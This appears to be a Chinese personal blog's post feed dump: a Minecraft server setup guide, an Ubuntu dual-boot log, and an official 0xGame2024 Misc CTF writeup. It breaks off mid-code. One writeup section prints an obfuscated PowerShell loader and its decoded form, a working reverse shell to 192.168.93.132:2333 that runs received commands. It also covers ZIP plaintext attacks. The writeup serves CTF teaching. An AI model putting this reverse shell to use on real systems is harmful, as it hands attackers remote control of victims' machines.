/opt/mcsmanager/</span><br><span class="line"><span class="built_in">cd</span> /opt/mcsmanager/</span><br><span class="line"></span><br><span class="line"><span class="comment"># Download MCSManager</span></span><br><span class="line">wget https://github.com/MCSManager/MCSManager/releases/latest/download/mcsmanager_linux_release.tar.gz</span><br><span class="line">tar -zxf mcsmanager_linux_release.tar.gz</span><br><span class="line"></span><br><span class="line"><span class="comment"># Install dependencies</span></span><br><span class="line">./install.sh</span><br><span class="line"></span><br><span class="line"><span class="comment"># Please open two terminals or screens.</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># Start the daemon first.</span></span><br><span class="line">./start-daemon.sh</span><br><span class="line"></span><br><span class="line"><span class="comment"># Start the web interface at the second terminal or screen.</span></span><br><span class="line">./start-web.sh</span><br><span class="line"></span><br><span class="line"><span class="comment"># For web access, go to http://localhost:23333/</span></span><br><span class="line"><span class="comment"># In general, the web interface will automatically scan and add the local daemon.</span></span><br></pre></td></tr></table></figure><p>MCSM的启动和暂停</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">systemctl start mcsm-&#123;web,daemon&#125;</span><br><span class="line">systemctl stop mcsm-&#123;web,daemon&#125;</span><br></pre></td></tr></table></figure><h2 id="MC，启动！"><a href="#MC，启动！" class="headerlink" title="MC，启动！"></a>MC，启动！</h2><p>访问23333端口，即为MCSM的面板，自己注册一个账号。</p><p><strong>注意：这个账号只能在这时注册一次，一旦注册成功，其用户名和密码将无法再修改！所以一定要记住账号密码！</strong><img src="/images/MC%E6%9C%8D%E5%8A%A1%E5%99%A8%E6%90%AD%E5%BB%BA/image-20241205194518342.png" alt="image-20241205194518342"></p><p>先在<a href="https://fabricmc.net/use/server/">fabric的官网</a>上下载一个服务端的核心</p><p><img src="/images/MC%E6%9C%8D%E5%8A%A1%E5%99%A8%E6%90%AD%E5%BB%BA/image-20241205195446296.png" alt="image-20241205195446296"></p><p>接下来就是在面板上创建一个实例</p><p><img src="/images/MC%E6%9C%8D%E5%8A%A1%E5%99%A8%E6%90%AD%E5%BB%BA/image-20241205195727811.png" alt="image-20241205195727811"></p><p><img src="/images/MC%E6%9C%8D%E5%8A%A1%E5%99%A8%E6%90%AD%E5%BB%BA/image-20241205195802911.png" alt="image-20241205195802911"></p><p><img src="/images/MC%E6%9C%8D%E5%8A%A1%E5%99%A8%E6%90%AD%E5%BB%BA/image-20241205195823300.png" alt="image-20241205195823300"></p><p><img src="/images/MC%E6%9C%8D%E5%8A%A1%E5%99%A8%E6%90%AD%E5%BB%BA/image-20241205195904336.png" alt="image-20241205195904336"></p><p>这里的启动命令我填写的是</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">java -Xmx12G -server -Dfile.encoding=UTF-8 -Duser.language=zh -Duser.country=CN -jar <span class="variable">$&#123;ProgramName&#125;</span></span><br></pre></td></tr></table></figure><p>这里的<code>-Xmx12G</code>表示内存限制最大为12G，填写这个的时候根据自己的服务器实际情况来，比服务器内存小一点就行。剩下的<code>-Dfile.encoding=UTF-8</code>表示编码定义为UTF-8，<code>-Duser.language=zh</code>表示语言为中文，<code>-Duser.country=CN</code>表示国家为中国，防止后面出现乱码的问题。</p><p><img src="/images/MC%E6%9C%8D%E5%8A%A1%E5%99%A8%E6%90%AD%E5%BB%BA/image-20241205200136679.png" alt="image-20241205200136679"></p><p>接下来在选择文件中上传我们刚刚下载的服务端核心，上传成功实例就会启动。</p><p><img src="/images/MC%E6%9C%8D%E5%8A%A1%E5%99%A8%E6%90%AD%E5%BB%BA/image-20241205200644403.png" alt="image-20241205200644403"></p><p>接下来点击前往实例控制台，然后点击开启，等待下载一些配置，看到下面的输出即为安装成功</p><p><img src="/images/MC%E6%9C%8D%E5%8A%A1%E5%99%A8%E6%90%AD%E5%BB%BA/image-20241205201011935.png" alt="image-20241205201011935"></p><p>看到说Failed to load eula.txt，往下翻，点击服务端配置文件</p><p><img src="/images/MC%E6%9C%8D%E5%8A%A1%E5%99%A8%E6%90%AD%E5%BB%BA/image-20241205201153091.png" alt="image-20241205201153091"></p><p>编辑eula.txt</p><p><img src="/images/MC%E6%9C%8D%E5%8A%A1%E5%99%A8%E6%90%AD%E5%BB%BA/image-20241205201228724.png" alt="image-20241205201228724"></p><p>改为是以后点击保存</p><p><img src="/images/MC%E6%9C%8D%E5%8A%A1%E5%99%A8%E6%90%AD%E5%BB%BA/image-20241205201257796.png" alt="image-20241205201257796"></p><p>回到终端，再一次点击开启，看到一下输出即为启动成功</p><p><img src="/images/MC%E6%9C%8D%E5%8A%A1%E5%99%A8%E6%90%AD%E5%BB%BA/image-20241205201510296.png" alt="image-20241205201510296"></p><p>至此，MC服务器已初步搭建完毕。</p><h2 id="一些更多的配置"><a href="#一些更多的配置" class="headerlink" title="一些更多的配置"></a>一些更多的配置</h2><h3 id="server-properties"><a href="#server-properties" class="headerlink" title="server.properties"></a>server.properties</h3><p>还是选择服务端配置文件，编辑server.properties</p><p>里面的标注其实已经很清楚了，照着按需求改就行</p><p><img src="/images/MC%E6%9C%8D%E5%8A%A1%E5%99%A8%E6%90%AD%E5%BB%BA/image-20241205203942290.png" alt="image-20241205203942290"></p><h3 id="模组添加"><a href="#模组添加" class="headerlink" title="模组添加"></a>模组添加</h3><p>打开文件管理，找到mods文件夹，把模组放进去就行</p><p><img src="/images/MC%E6%9C%8D%E5%8A%A1%E5%99%A8%E6%90%AD%E5%BB%BA/image-20241205212046811.png" alt="image-20241205212046811"></p>]]></content>
      
      
      <categories>
          
          <category> Technology </category>
          
      </categories>
      
      
        <tags>
            
            <tag> MC </tag>
            
            <tag> Technology </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>吾杯2024 Writeup</title>
      <link href="/posts/8841bb0/"/>
      <url>/posts/8841bb0/</url>
      
        <content type="html"><![CDATA[<h4 id="Writeup"><a href="#Writeup" class="headerlink" title="Writeup"></a><a href="https://www.blog.st4rr.top/writeups/%E5%90%BE%E6%9D%AF2024Writeup.pdf">Writeup</a></h4>]]></content>
      
      
      <categories>
          
          <category> Writeup </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Writeup </tag>
            
            <tag> CTF </tag>
            
            <tag> 吾杯 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>ubuntu双系统安装记录</title>
      <link href="/posts/a7636cee/"/>
      <url>/posts/a7636cee/</url>
      
        <content type="html"><![CDATA[<blockquote><p>之前装过双系统没有写记录，导致现在又需要装就不得不又到处找文章。遂决定这一次写一下记录，方便之后查找。。。</p></blockquote><p>参考文章：</p><p><a href="https://blog.csdn.net/sslFxxx/article/details/140161076?ops_request_misc=&request_id=&biz_id=102&utm_term=ubuntu%E5%8F%8C%E7%B3%BB%E7%BB%9F%E5%AE%89%E8%A3%85&utm_medium=distribute.pc_search_result.none-task-blog-2~all~sobaiduweb~default-1-140161076.142%5Ev100%5Epc_search_result_base1&spm=1018.2226.3001.4187">传送门一</a>，<a href="https://blog.csdn.net/weixin_65688914/article/details/132661114?ops_request_misc=%257B%2522request%255Fid%2522%253A%2522cb99f07ca56697c5ff7a5b882bb2ea53%2522%252C%2522scm%2522%253A%252220140713.130102334..%2522%257D&request_id=cb99f07ca56697c5ff7a5b882bb2ea53&biz_id=0&utm_medium=distribute.pc_search_result.none-task-blog-2~all~top_click~default-2-132661114-null-null.142%5Ev100%5Epc_search_result_base1&utm_term=ubuntu%E5%8F%8C%E7%B3%BB%E7%BB%9F%E5%AE%89%E8%A3%85&spm=1018.2226.3001.4187">传送门二</a>，<a href="https://blog.csdn.net/weixin_65688914/article/details/132661114?ops_request_misc=%257B%2522request%255Fid%2522%253A%2522cb99f07ca56697c5ff7a5b882bb2ea53%2522%252C%2522scm%2522%253A%252220140713.130102334..%2522%257D&request_id=cb99f07ca56697c5ff7a5b882bb2ea53&biz_id=0&utm_medium=distribute.pc_search_result.none-task-blog-2~all~top_click~default-2-132661114-null-null.142%5Ev100%5Epc_search_result_base1&utm_term=ubuntu%E5%8F%8C%E7%B3%BB%E7%BB%9F%E5%AE%89%E8%A3%85&spm=1018.2226.3001.4187">传送门三</a></p><p>首先在<a href="https://mirrors.tuna.tsinghua.edu.cn/ubuntu-releases/24.10/">清华镜像源</a>下载需要的镜像，这里我下载的是ubuntu24.10</p><p><img src="/images/ubuntu%E5%8F%8C%E7%B3%BB%E7%BB%9F%E5%AE%89%E8%A3%85%E8%AE%B0%E5%BD%95/image-20241124184845671.png" alt="image-20241124184845671"></p><p>接下来需要准备一个8G以上的空U盘，用来制作启动盘。这里我用的是rufus4.6.exe。</p><img src="/images/ubuntu双系统安装记录/image-20241124185224489.png" alt="image-20241124185224489" style="zoom:50%;" /><img src="/images/ubuntu双系统安装记录/image-20241124185302414.png" alt="image-20241124185302414" style="zoom:50%;" /><p>在要安装双系统的电脑本身的windows上打开开始-磁盘管理，右键打算从中分出分出空间给ubuntu的磁盘，选择压缩卷</p><img src="/images/ubuntu双系统安装记录/image-20241124191552068.png" alt="image-20241124191552068" style="zoom:50%;" /><p>输入要分配出的空间大小，这里我分配了200个G，点击压缩</p><img src="/images/ubuntu双系统安装记录/image-20241124191739330.png" alt="image-20241124191739330" style="zoom:50%;" /><p>由于我的电脑是联想的，开机的时候按F12进入Boot Menu，选择USB HDD回车</p><p><img src="/images/ubuntu%E5%8F%8C%E7%B3%BB%E7%BB%9F%E5%AE%89%E8%A3%85%E8%AE%B0%E5%BD%95/image-20241124192853905.png" alt="image-20241124192853905"></p><p>直接选第一个回车</p><p><img src="/images/ubuntu%E5%8F%8C%E7%B3%BB%E7%BB%9F%E5%AE%89%E8%A3%85%E8%AE%B0%E5%BD%95/0420f115bee9524fc5ff603f74dbe65.jpg" alt="0420f115bee9524fc5ff603f74dbe65"></p><p>进入后进行一系列配置，如下</p><p><img src="/images/ubuntu%E5%8F%8C%E7%B3%BB%E7%BB%9F%E5%AE%89%E8%A3%85%E8%AE%B0%E5%BD%95/image-20241124202556638.png" alt="image-20241124202556638"></p><p><img src="/images/ubuntu%E5%8F%8C%E7%B3%BB%E7%BB%9F%E5%AE%89%E8%A3%85%E8%AE%B0%E5%BD%95/image-20241124202602331.png" alt="image-20241124202602331"></p><p><img src="/images/ubuntu%E5%8F%8C%E7%B3%BB%E7%BB%9F%E5%AE%89%E8%A3%85%E8%AE%B0%E5%BD%95/image-20241124202607349.png" alt="image-20241124202607349"></p><p><img src="/images/ubuntu%E5%8F%8C%E7%B3%BB%E7%BB%9F%E5%AE%89%E8%A3%85%E8%AE%B0%E5%BD%95/image-20241124202615933.png" alt="image-20241124202615933"></p><p><img src="/images/ubuntu%E5%8F%8C%E7%B3%BB%E7%BB%9F%E5%AE%89%E8%A3%85%E8%AE%B0%E5%BD%95/image-20241124202620614.png" alt="image-20241124202620614"></p><p><img src="/images/ubuntu%E5%8F%8C%E7%B3%BB%E7%BB%9F%E5%AE%89%E8%A3%85%E8%AE%B0%E5%BD%95/image-20241124202626786.png" alt="image-20241124202626786"></p><p><img src="/images/ubuntu%E5%8F%8C%E7%B3%BB%E7%BB%9F%E5%AE%89%E8%A3%85%E8%AE%B0%E5%BD%95/image-20241124202632823.png" alt="image-20241124202632823"><img src="/images/ubuntu%E5%8F%8C%E7%B3%BB%E7%BB%9F%E5%AE%89%E8%A3%85%E8%AE%B0%E5%BD%95/image-20241124202640936.png" alt="image-20241124202640936"></p><p><img src="/images/ubuntu%E5%8F%8C%E7%B3%BB%E7%BB%9F%E5%AE%89%E8%A3%85%E8%AE%B0%E5%BD%95/image-20241124202647820.png" alt="image-20241124202647820"></p><p><img src="/images/ubuntu%E5%8F%8C%E7%B3%BB%E7%BB%9F%E5%AE%89%E8%A3%85%E8%AE%B0%E5%BD%95/image-20241124202652450.png" alt="image-20241124202652450"></p><p><img src="/images/ubuntu%E5%8F%8C%E7%B3%BB%E7%BB%9F%E5%AE%89%E8%A3%85%E8%AE%B0%E5%BD%95/image-20241124202658499.png" alt="image-20241124202658499"></p><p><img src="/images/ubuntu%E5%8F%8C%E7%B3%BB%E7%BB%9F%E5%AE%89%E8%A3%85%E8%AE%B0%E5%BD%95/image-20241124202704096.png" alt="image-20241124202704096"></p><p>接下来等待一会儿，点击重启，拔掉U盘后按enter即可。</p><p>如有问题欢迎留言或者联系作者交流()</p>]]></content>
      
      
      <categories>
          
          <category> Technology </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Technology </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>极客大挑战2024 Writeup</title>
      <link href="/posts/df428ec6/"/>
      <url>/posts/df428ec6/</url>
      
        <content type="html"><![CDATA[<blockquote><p>跟w8nn9z师傅组队参加的这次比赛，题目质量挺不错的，能学到挺多东西</p></blockquote><h4 id="Writeup"><a href="#Writeup" class="headerlink" title="Writeup"></a><a href="https://www.blog.st4rr.top/writeups/%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%982024Writeup.pdf">Writeup</a></h4>]]></content>
      
      
      <categories>
          
          <category> Writeup </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Writeup </tag>
            
            <tag> CTF </tag>
            
            <tag> 极客大挑战 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>0xGame2024 Misc Official Writeup</title>
      <link href="/posts/511d172f/"/>
      <url>/posts/511d172f/</url>
      
        <content type="html"><![CDATA[<blockquote><p>其中打*的是我出的题</p></blockquote><h2 id="Misc"><a href="#Misc" class="headerlink" title="Misc"></a>Misc</h2><h3 id="0xGame2048"><a href="#0xGame2048" class="headerlink" title="0xGame2048*"></a>0xGame2048*</h3><p>提取一下题目中的关键词”2048”、”base”搜索一下，其实不难找到一种叫做base2048的编码。解密的方法有很多，我这里用的是toolsfx。</p><p><img src="/images/0xGame2024-Misc-Official-Writeup/1728912622916-03061021-430b-4491-9ff6-b88909cd2313.png" alt="img"></p><h3 id="一明一暗"><a href="#一明一暗" class="headerlink" title="一明一暗*"></a>一明一暗*</h3><p>这道题在出题时使用的是Bandizip 7.36，默认使用了快速压缩的方法。然而很多师傅的Bandizip默认的是正常压缩，因而在做题时出现了无法执行攻击的问题，这里不是出题人本意o(╥﹏╥)o，出题时并没有想过在这里设置门槛，给师傅们磕一个了。Orz</p><p>然而仍然有很多厉害的师傅通过各种方法解出来了，比如挨个尝试各种压缩方法、通过文件大小判断正确的压缩方法、以及直接从attachment.zip中抽去1.zip使其成为一个明文包（膜拜），因此也就没有修改题目。</p><p>接下来说一下预期解。</p><p>首先将得到的f1ag.jpg压缩成一个明文包，然后使用ARCHPR执行明文攻击。明文攻击时用不着等这个进度条全部走完，只需要到如下状态就可以直接点停止，保存下来的zip文件就是已经解密好的。</p><p><img src="/images/0xGame2024-Misc-Official-Writeup/1728912622997-0f54f3e8-18f9-41cb-9e61-33ff855d4e70.png" alt="img"></p><p>根据hint.txt的内容可以得知这是一个盲水印，可以在网上找到这样一个工具，直接对flag.png提取就行。</p><p><img src="/images/0xGame2024-Misc-Official-Writeup/1728912622960-e9c19936-d8bd-4e81-9b42-76cb973c1488.png" alt="img"></p><p><img src="/images/0xGame2024-Misc-Official-Writeup/1728912623024-5f16fd12-1eb9-4319-a296-a1b952a611a7.png" alt="img"></p><h3 id="加密的压缩包？"><a href="#加密的压缩包？" class="headerlink" title="加密的压缩包？"></a>加密的压缩包？</h3><p>用010editor查看，压缩包末尾给了一个password，可知这个压缩包原本应该是被加密了的。但是从加密标识位（下图选中部分）来看，这里是被设置成了未加密，因此这里其实是个伪不加密。</p><p><img src="/images/0xGame2024-Misc-Official-Writeup/1728912623005-978bd4db-fcff-4198-b5a7-417be0fbf4b8.png" alt="img"></p><p><img src="/images/0xGame2024-Misc-Official-Writeup/1728912624583-1db33a15-a6d4-4219-8c9d-9f2e4c532379.png" alt="img"></p><p>将加密位改为09以后保存，输入密码0xGame2024即可解压</p><p><img src="/images/0xGame2024-Misc-Official-Writeup/1728912624629-9d5cbb81-7a05-4571-bc87-600f74274f37.png" alt="img"></p><p><img src="/images/0xGame2024-Misc-Official-Writeup/1728912624616-b7537c66-a4af-4b79-a4eb-33a673bc544b.png" alt="img"></p><h3 id="我的世界基岩版"><a href="#我的世界基岩版" class="headerlink" title="我的世界基岩版(?*"></a>我的世界基岩版(?*</h3><p>先说一下预期解：</p><p>下载地图模组xaero’s minimap和xaero’s worldmap即可大概看到flag的轮廓，就是地上的那些基岩组成的字。接下来就是实地考察一下+尝试，可以得到flag是0xGame{MC_SErver_4_CTFers}</p><p><img src="/images/0xGame2024-Misc-Official-Writeup/1728912624631-d9a0ec8e-69aa-449c-97c9-63c33a005235.png" alt="img"></p><p>此外还有很多方法也都在预期之内，比如向上搭天梯看、使用tweakeroo模组直接灵魂出窍飞起来看、或者直接开各种各样的外挂都行。</p><p>服务器开出来一段时间后，有师傅搭建并维护了出生点物资领取处、天路、铁轨等造福后来的师傅（辛苦了）。但也有一些调皮的师傅，到处插告示牌在上面留假flag或者做假引导，出题人都在发现的第一时间进行了拆除。所以不要再拷打出题人了，那真的不是题目的一部分o(╥﹏╥)o :(</p><h3 id="呜呜呜-我再也不敢乱点了"><a href="#呜呜呜-我再也不敢乱点了" class="headerlink" title="呜呜呜~我再也不敢乱点了*"></a>呜呜呜~我再也不敢乱点了*</h3><p>灵感来源于CVE-2023-38831，当时看到感觉挺有意思的，就当成题出了</p><p>不过从解题来说知不知道这个CVE影响其实不大，感兴趣的可以了解一下</p><p>题目附件给了一个 <code>somethingGOOD.pcapng</code> 和一个<code>what_is_this.log</code>，打开流量包可以看到是TLS1.3协议的流量：</p><p><img src="/images/0xGame2024-Misc-Official-Writeup/1729496036561-30c65c77-4951-49ca-9e26-ebd61908ddae.png" alt="img"></p><p>查阅资料可知可以用 <code>key log</code> 文件，也就是<code>what_is_this.log</code>来解密TLS流量，在wireshark中的 <code>编辑-&gt;首选项-&gt;协议</code> 里找到TLS：</p><p><img src="/images/0xGame2024-Misc-Official-Writeup/1729496036668-894ee1a9-1641-448f-b719-bbd2bab0a8c0.png" alt="img"></p><p>之后就能看到http协议传输的 <code>wuyu.zip</code>，可以在 <code>文件-&gt;导出对象-&gt;HTTP</code> 中提取出来并解压，可以看到<code>introduction.txt </code>目录下有两个可疑文件，<code>clean_file_rubbish.ps1</code> 以及 <code>introduction.txt .bat</code></p><p>可以先对 <code>introduction.txt .bat</code> 进行分析，里面大部分是注释，真正执行的是当前目录下的ps1脚本文件：</p><p><img src="/images/0xGame2024-Misc-Official-Writeup/1729496036684-ddc2aca5-d1ae-4803-a1f3-3d10036c15c9.png" alt="img"></p><p>于是可以继续分析 <code>clean_file_rubbish.ps1</code> ，表面上是一个清理文件的功能，但同样这些代码都是被注释掉的，往下拖拉可以看到真正被混淆的powershell代码：</p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># just some unordered and garbled characters</span></span><br><span class="line"><span class="variable">$Cx99zNP0yc8btz1DgdjQ4d6Or1WXvNo8ujcqwFC3kgHFE9zERLRSUflsWbCwFagZeNLAt8td0BUZr85MNnhsIJtjt4781b120rrHzFZmMsUAPcAS4tHCiJx9Vst4SWWeSBn8IkFD6e4O6bMfzboKxPZiplfSpAXYD1iHJbuWsDciLYdqfa9TcbYHOWxeR91cFzmnKRYSFU573fAKQqZMCsiaLB2ZMGMlIbshBlb94PHljepzqNuqEo2uRQ0Pg4hLsKE7D4cXoCXuDAUwHPVQm3Jz6KQcfUWAlvGzhQKyzLBXGta8LH6Ua0yL8nFCPU4O3uIh58sIpSPEdxO4HkYZfKSF9ta6hrN2o8YWfbRMIdMHNNgywFv3YVlCzwKWP3suJq7yHHl0O0MW7dtk2t05bteVH0k4O0HOfKLQ4wDPrnwu5Q1d7L6JLvNEC9dAtXx56ACbzCHQMt8ZIaxZeLxWMnB7Q34pe0bmoO1hPZtiRENA4Scp1Gsm</span> = <span class="string">&quot;JExIT1NUID0gIjE5Mi4xNjguOTMuMTMyIjsgJExQT1JUID0gMjMzMzsgJFRDUENsaWVudCA9IE5ldy1PYmplY3QgTmV0LlNvY2tldHMuVENQQ2xpZW50KCRMSE9TVCwgJExQT1JUKTsgJE5ldHdvcmtTdHJlYW0gPSAkVENQQ2xpZW50LkdldFN0cmVhbSgpOyAkU3RyZWFtUmVhZGVyID0gTmV3LU9iamVjdCBJTy5TdHJlYW1SZWFkZXIoJE5ldHdvcmtTdHJlYW0pOyAkU3RyZWFtV3JpdGVyID0gTmV3LU9iamVjdCBJTy5TdHJlYW1Xcml0ZXIoJE5ldHdvcmtTdHJlYW0pOyAkU3RyZWFtV3JpdGVyLkF1dG9GbHVzaCA9ICR0cnVlOyAkQnVmZmVyID0gTmV3LU9iamVjdCBTeXN0ZW0uQnl0ZVtdIDEwMjQ7IHdoaWxlICgkVENQQ2xpZW50LkNvbm5lY3RlZCkgeyB3aGlsZSAoJE5ldHdvcmtTdHJlYW0uRGF0YUF2YWlsYWJsZSkgeyAkUmF3RGF0YSA9ICROZXR3b3JrU3RyZWFtLlJlYWQoJEJ1ZmZlciwgMCwgJEJ1ZmZlci5MZW5ndGgpOyAkQ29kZSA9IChbdGV4dC5lbmNvZGluZ106OlVURjgpLkdldFN0cmluZygkQnVmZmVyLCAwLCAkUmF3RGF0YSAtMSkgfTsgaWYgKCRUQ1BDbGllbnQuQ29ubmVjdGVkIC1hbmQgJENvZGUuTGVuZ3RoIC1ndCAxKSB7ICRPdXRwdXQgPSB0cnkgeyBJbnZva2UtRXhwcmVzc2lvbiAoJENvZGUpIDI+JjEgfSBjYXRjaCB7ICRfIH07ICRTdHJlYW1Xcml0ZXIuV3JpdGUoIiRPdXRwdXRgbiIpOyAkQ29kZSA9ICRudWxsIH0gfTsgJFRDUENsaWVudC5DbG9zZSgpOyAkTmV0d29ya1N0cmVhbS5DbG9zZSgpOyAkU3RyZWFtUmVhZGVyLkNsb3NlKCk7ICRTdHJlYW1Xcml0ZXIuQ2xvc2UoKQ==&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># Don&#x27;t think too much</span></span><br><span class="line"><span class="variable">$SsuhfRO1wgyokMOlaEmBBcAzcInXG54WdHo9eVpNI9Xhb0kluCXXz5hxYS7pzUgJOfnpV8ZkPMhHNCtTMkSg1Sj32zonCoq4qXXfBsmASttQtGic0mBErHBYS6ROmJohHmnHTYa2ijVwYv8vfzgFLW6rPkY1LpsEVrbfCqc6QFCdo3mzQIkyU1pbPKuH2IDPbkYshWZYoiLxtYBdsGa6ZtvZ8WpbYhmHEcXG4RGhhoLPTnTITmSZJ7rm24GYws75qN4ZOH4Wf9IBSHuRLtOmGVi23anihNphBV8IkTmT6vhChsJwC6HY1zTN4lbA4wmdtEjhSyEF3pY2XLm8RTzIZAkoAiKvzD7V1rLdMa5nUo0c2eDe9wpnJ1qWhOy1GuVYMFI09bVegrdWHlQ4np4GWDAlc8FJhzM6gzRHwbklJmLtPcwm1MFf0vlh9lLqLpMdS586AnnBMuJezW6Tpmta4O5HaDxLsb3S8l3wTxCjoad1BdqAoZa1</span> = [<span class="type">System.Text.Encoding</span>]::UTF8.GetString([<span class="type">System.Convert</span>]::FromBase64String(<span class="variable">$Cx99zNP0yc8btz1DgdjQ4d6Or1WXvNo8ujcqwFC3kgHFE9zERLRSUflsWbCwFagZeNLAt8td0BUZr85MNnhsIJtjt4781b120rrHzFZmMsUAPcAS4tHCiJx9Vst4SWWeSBn8IkFD6e4O6bMfzboKxPZiplfSpAXYD1iHJbuWsDciLYdqfa9TcbYHOWxeR91cFzmnKRYSFU573fAKQqZMCsiaLB2ZMGMlIbshBlb94PHljepzqNuqEo2uRQ0Pg4hLsKE7D4cXoCXuDAUwHPVQm3Jz6KQcfUWAlvGzhQKyzLBXGta8LH6Ua0yL8nFCPU4O3uIh58sIpSPEdxO4HkYZfKSF9ta6hrN2o8YWfbRMIdMHNNgywFv3YVlCzwKWP3suJq7yHHl0O0MW7dtk2t05bteVH0k4O0HOfKLQ4wDPrnwu5Q1d7L6JLvNEC9dAtXx56ACbzCHQMt8ZIaxZeLxWMnB7Q34pe0bmoO1hPZtiRENA4Scp1Gsm</span>))</span><br><span class="line"></span><br><span class="line"><span class="comment"># If you don’t believe it, you can try it</span></span><br><span class="line"><span class="built_in">Invoke-Expression</span> <span class="variable">$SsuhfRO1wgyokMOlaEmBBcAzcInXG54WdHo9eVpNI9Xhb0kluCXXz5hxYS7pzUgJOfnpV8ZkPMhHNCtTMkSg1Sj32zonCoq4qXXfBsmASttQtGic0mBErHBYS6ROmJohHmnHTYa2ijVwYv8vfzgFLW6rPkY1LpsEVrbfCqc6QFCdo3mzQIkyU1pbPKuH2IDPbkYshWZYoiLxtYBdsGa6ZtvZ8WpbYhmHEcXG4RGhhoLPTnTITmSZJ7rm24GYws75qN4ZOH4Wf9IBSHuRLtOmGVi23anihNphBV8IkTmT6vhChsJwC6HY1zTN4lbA4wmdtEjhSyEF3pY2XLm8RTzIZAkoAiKvzD7V1rLdMa5nUo0c2eDe9wpnJ1qWhOy1GuVYMFI09bVegrdWHlQ4np4GWDAlc8FJhzM6gzRHwbklJmLtPcwm1MFf0vlh9lLqLpMdS586AnnBMuJezW6Tpmta4O5HaDxLsb3S8l3wTxCjoad1BdqAoZa1</span></span><br></pre></td></tr></table></figure><p>主要是将变量名变得复杂一些+base64加密关键代码，最终解完混淆可以发现执行了一个反弹shell的操作：</p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$LHOST</span> = <span class="string">&quot;192.168.93.132&quot;</span>; <span class="variable">$LPORT</span> = <span class="number">2333</span>; <span class="variable">$TCPClient</span> = <span class="built_in">New-Object</span> Net.Sockets.TCPClient(<span class="variable">$LHOST</span>, <span class="variable">$LPORT</span>); <span class="variable">$NetworkStream</span> = <span class="variable">$TCPClient</span>.GetStream(); <span class="variable">$StreamReader</span> = <span class="built_in">New-Object</span> IO.StreamReader(<span class="variable">$NetworkStream</span>); <span class="variable">$StreamWriter</span> = <span class="built_in">New-Object</span> IO.StreamWriter(<span class="variable">$NetworkStream</span>); <span class="variable">$StreamWriter</span>.AutoFlush = <span class="variable">$true</span>; <span class="variable">$Buffer</span> = <span class="built_in">New-Object</span> System.Byte[] <span class="number">1024</span>; <span class="keyword">while</span> (<span class="variable">$TCPClient</span>.Connected) &#123; <span class="keyword">while</span> (<span class="variable">$NetworkStream</span>.DataAvailable) &#123; <span class="variable">$RawData</span> = <span class="variable">$NetworkStream</span>.Read(<span class="variable">$Buffer</span>, <span class="number">0</span>, <span class="variable">$Buffer</span>.Length); <span class="variable">$Code</span> = ([<span class="type">text.encoding</span>]::UTF8).GetString(<span class="variable">$Buffer</span>, <span class="number">0</span>, <span class="variable">$RawData</span> <span class="literal">-1</span>) &#125;; <span class="keyword">if</span> (<span class="variable">$TCPClient</span>.Connected <span class="operator">-and</span> <span class="variable">$Code</span>.Length <span class="operator">-gt</span> <span class="number">1</span>) &#123; <span class="variable">$Output</span> = <span class="keyword">try</span> &#123; <span class="built_in">Invoke-Expression</span> (<span class="variable">$Code</span>) <span class="number">2</span>&gt;&amp;<span class="number">1</span> &#125; <span class="keyword">catch</span> &#123; <span class="variable">$_</span> &#125;; <span class="variable">$StreamWriter</span>.Write(<span class="string">&quot;<span class="variable">$Output</span>`n&quot;</span>); <span class="variable">$Code</span> = <span class="variable">$null</span> &#125; &#125;; <span class="variable">$TCPClient</span>.Close(); <span class="variable">$NetworkStream</span>.Close(); <span class="variable">$StreamReader</span>.Close(); <span class="variable">$StreamWriter</span>.Close()</span><br></pre></td></tr></table></figure><p>之后计算MD5值就能得到flag：</p><p><img src="/images/0xGame2024-Misc-Official-Writeup/1729496036760-2b3aad84-9059-4d8d-b90b-abbea4d9957d.png" alt="img"></p><h3 id="我叫曼波"><a href="#我叫曼波" class="headerlink" title="我叫曼波"></a>我叫曼波</h3><p>题目附件给了 <code>encode.py</code>，加密的流程基本都给出了：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> random</span><br><span class="line"><span class="keyword">import</span> 